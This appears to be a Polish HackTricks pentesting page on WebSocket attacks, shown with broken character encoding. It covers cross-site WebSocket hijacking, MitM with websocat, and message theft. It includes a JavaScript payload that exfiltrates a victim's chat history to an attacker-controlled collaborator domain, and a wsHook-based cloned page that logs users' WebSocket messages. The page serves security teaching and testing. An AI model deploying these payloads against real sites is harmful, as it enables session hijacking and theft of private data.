# Ataki WebSocket

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}

## Czym sÄ… WebSockety

PoÅ‚Ä…czenia WebSocket sÄ… nawiÄ…zywane poprzez poczÄ…tkowe **HTTP** handshake i sÄ… zaprojektowane jako **dÅ‚ugoterminowe**, co pozwala na dwukierunkowe przesyÅ‚anie wiadomoÅ›ci w dowolnym momencie bez potrzeby systemu transakcyjnego. To sprawia, Å¼e WebSockety sÄ… szczegÃ³lnie korzystne dla aplikacji wymagajÄ…cych **niskiej latencji lub komunikacji inicjowanej przez serwer**, takich jak strumienie danych finansowych na Å¼ywo.

### NawiÄ…zywanie poÅ‚Ä…czeÅ„ WebSocket

SzczegÃ³Å‚owe wyjaÅ›nienie nawiÄ…zywania poÅ‚Ä…czeÅ„ WebSocket moÅ¼na znaleÅºÄ‡ [**tutaj**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). PodsumowujÄ…c, poÅ‚Ä…czenia WebSocket sÄ… zazwyczaj inicjowane za pomocÄ… JavaScript po stronie klienta, jak pokazano poniÅ¼ej:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
ProtokÃ³Å‚ `wss` oznacza poÅ‚Ä…czenie WebSocket zabezpieczone **TLS**, podczas gdy `ws` wskazuje na poÅ‚Ä…czenie **niezabezpieczone**.

Podczas nawiÄ…zywania poÅ‚Ä…czenia wykonywane jest uzgadnianie miÄ™dzy przeglÄ…darkÄ… a serwerem za pomocÄ… HTTP. Proces uzgadniania polega na tym, Å¼e przeglÄ…darka wysyÅ‚a Å¼Ä…danie, a serwer odpowiada, jak pokazano w nastÄ™pujÄ…cych przykÅ‚adach:

PrzeglÄ…darka wysyÅ‚a Å¼Ä…danie uzgadniania:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
OdpowiedÅº serwera na handshake:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Po nawiÄ…zaniu poÅ‚Ä…czenia pozostaje ono otwarte do wymiany wiadomoÅ›ci w obu kierunkach.

**Kluczowe punkty handshake WebSocket:**

- NagÅ‚Ã³wki `Connection` i `Upgrade` sygnalizujÄ… rozpoczÄ™cie handshake WebSocket.
- NagÅ‚Ã³wek `Sec-WebSocket-Version` wskazuje poÅ¼Ä…danÄ… wersjÄ™ protokoÅ‚u WebSocket, zazwyczaj `13`.
- W nagÅ‚Ã³wku `Sec-WebSocket-Key` wysyÅ‚ana jest losowa wartoÅ›Ä‡ zakodowana w Base64, co zapewnia, Å¼e kaÅ¼dy handshake jest unikalny, co pomaga zapobiegaÄ‡ problemom z proxy pamiÄ™ci podrÄ™cznej. Ta wartoÅ›Ä‡ nie sÅ‚uÅ¼y do uwierzytelniania, ale do potwierdzenia, Å¼e odpowiedÅº nie jest generowana przez Åºle skonfigurowany serwer lub pamiÄ™Ä‡ podrÄ™cznÄ….
- NagÅ‚Ã³wek `Sec-WebSocket-Accept` w odpowiedzi serwera jest hashem `Sec-WebSocket-Key`, weryfikujÄ…cym zamiar serwera do otwarcia poÅ‚Ä…czenia WebSocket.

Te funkcje zapewniajÄ…, Å¼e proces handshake jest bezpieczny i niezawodny, torujÄ…c drogÄ™ do efektywnej komunikacji w czasie rzeczywistym.


### Konsola Linux

MoÅ¼esz uÅ¼yÄ‡ `websocat`, aby nawiÄ…zaÄ‡ surowe poÅ‚Ä…czenie z websocketem.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Lub aby utworzyÄ‡ serwer websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket connections

JeÅ›li odkryjesz, Å¼e klienci sÄ… poÅ‚Ä…czeni z **HTTP websocket** z twojej bieÅ¼Ä…cej lokalnej sieci, moÅ¼esz sprÃ³bowaÄ‡ [ARP Spoofing Attack](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing), aby przeprowadziÄ‡ atak MitM miÄ™dzy klientem a serwerem.\
Gdy klient prÃ³buje siÄ™ poÅ‚Ä…czyÄ‡, moÅ¼esz wtedy uÅ¼yÄ‡:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets enumeration

MoÅ¼esz uÅ¼yÄ‡ **narzÄ™dzia** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **do automatycznego odkrywania, identyfikacji i wyszukiwania znanych** **vulnerabilities** w websockets.

### Websocket Debug tools

* **Burp Suite** obsÅ‚uguje komunikacjÄ™ MitM websockets w bardzo podobny sposÃ³b, jak robi to dla zwykÅ‚ej komunikacji HTTP.
* Rozszerzenie [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite** pozwoli Ci lepiej zarzÄ…dzaÄ‡ komunikacjÄ… Websocket w Burp, uzyskujÄ…c **historiÄ™**, ustawiajÄ…c **reguÅ‚y przechwytywania**, uÅ¼ywajÄ…c reguÅ‚ **match and replace**, korzystajÄ…c z **Intruder** i **AutoRepeater.**
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** SkrÃ³t od "**WebSocket/Socket.io Proxy**", to narzÄ™dzie, napisane w Node.js, zapewnia interfejs uÅ¼ytkownika do **przechwytywania, przechwytywania, wysyÅ‚ania niestandardowych** wiadomoÅ›ci i przeglÄ…dania wszystkich komunikacji WebSocket i Socket.IO miÄ™dzy klientem a serwerem.
* [**wsrepl**](https://github.com/doyensec/wsrepl) to **interaktywny websocket REPL** zaprojektowany specjalnie do testÃ³w penetracyjnych. Zapewnia interfejs do obserwowania **przychodzÄ…cych wiadomoÅ›ci websocket i wysyÅ‚ania nowych**, z Å‚atwym w uÅ¼yciu frameworkiem do **automatyzacji** tej komunikacji.&#x20;
* [**https://websocketking.com/**](https://websocketking.com/) to **strona internetowa do komunikacji** z innymi stronami za pomocÄ… **websockets**.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) wÅ›rÃ³d innych typÃ³w komunikacji/protokÃ³Å‚Ã³w, zapewnia **stronÄ™ do komunikacji** z innymi stronami za pomocÄ… **websockets.**

## Websocket Lab

W [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) masz kod do uruchomienia strony internetowej uÅ¼ywajÄ…cej websockets, a w [**tym poÅ›cie**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) moÅ¼esz znaleÅºÄ‡ wyjaÅ›nienie.

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking**, znane rÃ³wnieÅ¼ jako **cross-origin WebSocket hijacking**, jest identyfikowane jako specyficzny przypadek **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** wpÅ‚ywajÄ…cy na handshake WebSocket. Ta luka wystÄ™puje, gdy handshakes WebSocket uwierzytelniajÄ… siÄ™ wyÅ‚Ä…cznie za pomocÄ… **HTTP cookies** bez **CSRF tokens** lub podobnych Å›rodkÃ³w bezpieczeÅ„stwa.

Napastnicy mogÄ… to wykorzystaÄ‡, hostujÄ…c **zÅ‚oÅ›liwÄ… stronÄ™ internetowÄ…**, ktÃ³ra inicjuje poÅ‚Ä…czenie WebSocket miÄ™dzy witrynami z podatnÄ… aplikacjÄ…. W konsekwencji to poÅ‚Ä…czenie jest traktowane jako czÄ™Å›Ä‡ sesji ofiary z aplikacjÄ…, wykorzystujÄ…c brak ochrony CSRF w mechanizmie obsÅ‚ugi sesji.

### Simple Attack

ZauwaÅ¼, Å¼e podczas **nawiÄ…zywania** poÅ‚Ä…czenia **websocket** **cookie** jest **wysyÅ‚ane** do serwera. **Serwer** moÅ¼e go uÅ¼ywaÄ‡ do **powiÄ…zania** kaÅ¼dego **konkretnego** **uÅ¼ytkownika** z jego **sesjÄ… websocket** na podstawie wysÅ‚anego cookie.

JeÅ›li na **przykÅ‚ad** **serwer websocket** **wysyÅ‚a z powrotem historiÄ™ rozmowy** uÅ¼ytkownika, jeÅ›li wysÅ‚ana zostanie wiadomoÅ›Ä‡ z "**READY"**, to **prosty XSS** nawiÄ…zujÄ…cy poÅ‚Ä…czenie (**cookie** zostanie **wysÅ‚ane** **automatycznie** w celu autoryzacji uÅ¼ytkownika ofiary) **wysyÅ‚ajÄ…c** "**READY**" bÄ™dzie w stanie **odzyskaÄ‡** historiÄ™ **rozmowy**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie z innym subdomenÄ…

W tym wpisie na blogu [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) atakujÄ…cy zdoÅ‚aÅ‚ **wykonaÄ‡ dowolny Javascript w subdomenie** domeny, w ktÃ³rej odbywaÅ‚a siÄ™ komunikacja przez web socket. PoniewaÅ¼ byÅ‚a to **subdomena**, **ciasteczko** byÅ‚o **wysyÅ‚ane**, a poniewaÅ¼ **Websocket nie sprawdzaÅ‚ poprawnie Origin**, moÅ¼liwe byÅ‚o komunikowanie siÄ™ z nim i **kradzieÅ¼ tokenÃ³w**.

### KradzieÅ¼ danych od uÅ¼ytkownika

Skopiuj aplikacjÄ™ webowÄ…, ktÃ³rÄ… chcesz naÅ›ladowaÄ‡ (na przykÅ‚ad pliki .html) i wewnÄ…trz skryptu, w ktÃ³rym odbywa siÄ™ komunikacja przez websocket, dodaj ten kod:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
Teraz pobierz plik `wsHook.js` z [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) i **zapisz go w folderze z plikami webowymi**.\
Ekspozycja aplikacji webowej i zmuszenie uÅ¼ytkownika do poÅ‚Ä…czenia siÄ™ z niÄ… pozwoli ci ukraÅ›Ä‡ wysyÅ‚ane i odbierane wiadomoÅ›ci za pomocÄ… websocket:
```javascript
sudo python3 -m http.server 80
```
## Warunki wyÅ›cigu

Warunki wyÅ›cigu w WebSocketach rÃ³wnieÅ¼ istniejÄ…, [sprawdÅº te informacje, aby dowiedzieÄ‡ siÄ™ wiÄ™cej](race-condition.md#rc-in-websockets).

## Inne podatnoÅ›ci

PoniewaÅ¼ WebSockety sÄ… mechanizmem do **wysyÅ‚ania danych na stronÄ™ serwera i klienta**, w zaleÅ¼noÅ›ci od tego, jak serwer i klient obsÅ‚ugujÄ… informacje, **WebSockety mogÄ… byÄ‡ uÅ¼ywane do wykorzystywania kilku innych podatnoÅ›ci, takich jak XSS, SQLi lub jakiejkolwiek innej powszechnej podatnoÅ›ci webowej, wykorzystujÄ…c dane wejÅ›ciowe uÅ¼ytkownika z websocketu.**

## **Przemyt WebSocketÃ³w**

Ta podatnoÅ›Ä‡ moÅ¼e pozwoliÄ‡ na **obejÅ›cie ograniczeÅ„ odwrotnych proxy**, sprawiajÄ…c, Å¼e uwierzÄ…, Å¼e **komunikacja websocketowa zostaÅ‚a nawiÄ…zana** (nawet jeÅ›li to nieprawda). MoÅ¼e to pozwoliÄ‡ atakujÄ…cemu na **dostÄ™p do ukrytych punktÃ³w koÅ„cowych**. Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº nastÄ™pujÄ…cÄ… stronÄ™:

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## Odniesienia

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
